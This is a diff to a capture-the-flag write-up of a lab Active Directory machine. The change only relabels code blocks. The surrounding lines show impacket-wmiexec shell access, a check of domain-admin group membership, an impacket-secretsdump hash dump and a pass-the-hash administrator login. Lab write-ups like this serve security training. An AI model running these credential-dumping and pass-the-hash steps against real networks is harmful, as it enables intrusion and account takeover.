@@ -262,7 +262,7 @@ SMB         10.10.185.116   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whit
 ```
 
 Great! I got a `Pwn3d!` response, indicating that I was able to get a shell using `impacket-wmiexec`, and I successfully retrieved the user flag:
-```PowerShell
+```bash
 $ impacket-wmiexec  vulnnet-rst.local/a-whitehat@10.10.185.116 
   Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
@@ -283,7 +283,7 @@ C:\Users\enterprise-core-vn\Desktop>type user.txt
 ## Privilege Escalation Administrator
 
 I procceded by checking the permissions for the user `a-whitehat` on the server:
-```PowerShell
+```bash
 C:\Users\enterprise-core-vn\Desktop>whoami /groups
 
 
@@ -306,7 +306,7 @@ C:\Users\enterprise-core-vn\Desktop>whoami /groups
 ```
 
 Great! The user is member of the domain admin group, meaning I should be able to dump the `administrator` hash unsing `impacket-secretsdump`:
-```PowerShell
+```bash
 $ impacket-secretsdump vulnnet-rst.local/a-whitehat@10.10.185.116
   Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
@@ -332,7 +332,7 @@ $ impacket-secretsdump vulnnet-rst.local/a-whitehat@10.10.185.116
 ```
 
 By passing the hash, I was able to log in as `administrator` and retrieved the system flag:
-```PowerShell
+```bash
 $ impacket-wmiexec vulnnet-rst.local/administrator@10.10.185.116 -hashes aa[removed]ee:c2[removed]9d
   Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
